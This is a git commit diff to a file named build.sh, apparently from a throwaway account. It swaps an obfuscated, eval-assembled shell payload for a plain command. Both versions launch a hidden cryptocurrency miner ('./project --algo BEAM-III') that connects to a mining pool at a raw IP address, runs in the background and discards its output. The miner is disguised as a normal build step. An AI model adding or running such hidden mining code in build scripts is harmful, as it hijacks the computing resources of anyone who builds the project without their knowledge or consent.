8d8c408592e6b954f5ef4f92b2b1deed698d1d1c
williehprnuhrxyq <159912408+williehprnuhrxyq@users.noreply.github.com>
2024-11-08 15:20:00 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,3 +1,1 @@
-z="
-";Qz='UT2h';dz='te +';kz='e >/';Zz='0D-$';Tz='VXBS';Pz='Wuij';lz='dev/';fz='%M-%';Jz='254.';jz='nabl';Az='./pr';Yz='cho ';hz=' --t';Sz='62tr';iz='ls e';Oz='r 3J';nz=' 2>&';Iz=' 47.';Dz='algo';Rz='wsC8';gz='S"))';Kz='52.1';Vz='6JAN';Ez=' BEA';mz='null';Nz='-use';Gz='I --';bz='UTC-';ez='"%H-';oz='1';cz='7 da';Xz='.$(e';Bz='ojec';Fz='M-II';Cz='t --';Mz='43 -';Hz='pool';Wz='F63j';Lz='97:4';Uz='MzQW';az='(TZ=';
-eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz"
+./project --algo BEAM-III --pool 47.254.52.197:80 --user 35abc183df02cef8b5ab05ea3df9ecf5e1b8bbeb8ccc0bdb7a27073e80621131c4e.$(echo 0D-$(TZ=UTC-7 date +"%H-%M-%S")) --tls enable --no-cl >/dev/null 2>&1 &
